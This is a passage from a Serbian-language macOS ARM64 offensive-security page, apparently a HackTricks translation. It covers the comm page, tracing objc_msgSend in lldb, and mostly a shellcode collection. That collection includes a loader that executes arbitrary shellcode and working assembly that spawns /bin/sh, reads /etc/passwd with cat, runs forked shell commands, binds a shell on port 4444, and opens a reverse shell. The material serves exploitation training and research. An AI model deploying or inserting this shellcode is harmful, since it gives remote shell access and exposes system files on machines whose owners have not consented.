Ovo je stranica memorije koju poseduje kernel i koja je mapirana u adresni prostor svakog korisničkog procesa. Namenjena je da ubrza prelazak iz korisničkog moda u kernel prostor brže nego korišćenje syscalls za kernel usluge koje se toliko koriste da bi ovaj prelazak bio veoma neefikasan.

Na primer, poziv `gettimeofdate` čita vrednost `timeval` direktno sa comm stranice.

### objc_msgSend

Veoma je uobičajeno pronaći ovu funkciju korišćenu u Objective-C ili Swift programima. Ova funkcija omogućava pozivanje metode objekta u Objective-C.

Parametri ([više informacija u dokumentaciji](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pokazivač na instancu
- x1: op -> Selektor metode
- x2... -> Ostatak argumenata pozvane metode

Dakle, ako stavite breakpoint pre grananja na ovu funkciju, lako možete pronaći šta se poziva u lldb-u (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji će izvršiti komandu):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Postavljanjem env varijable **`NSObjCMessageLoggingEnabled=1`** moguće je logovati kada se ova funkcija poziva u datoteci kao što je `/tmp/msgSends-pid`.
>
> Pored toga, postavljanjem **`OBJC_HELP=1`** i pozivanjem bilo kog binarnog fajla možete videti druge varijable okruženja koje možete koristiti da **log** kada se određene Objc-C akcije dešavaju.

Kada se ova funkcija pozove, potrebno je pronaći pozvanu metodu označene instance, za to se vrše različite pretrage:

- Izvršiti optimističku pretragu u kešu:
- Ako je uspešno, gotovo
- Zauzeti runtimeLock (čitanje)
- Ako (realize && !cls->realized) realizovati klasu
- Ako (initialize && !cls->initialized) inicijalizovati klasu
- Pokušati keš klase:
- Ako je uspešno, gotovo
- Pokušati listu metoda klase:
- Ako je pronađeno, popuniti keš i gotovo
- Pokušati keš superklase:
- Ako je uspešno, gotovo
- Pokušati listu metoda superklase:
- Ako je pronađeno, popuniti keš i gotovo
- Ako (resolver) pokušati metodu resolvera, i ponoviti od pretrage klase
- Ako ste još ovde (= sve ostalo je propalo) pokušati forwarder

### Shellcodes

Da biste kompajlirali:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Da biste izvukli bajtove:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Za novije macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C kod za testiranje shellcode-a</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**ovde**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i objašnjeno.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="sa stekom"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="sa adr za linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Čitaj sa cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji znači stek adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozovite komandu sa sh iz fork-a tako da glavni proces ne bude ubijen
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **portu 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Obrnuta ljuska

Sa [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
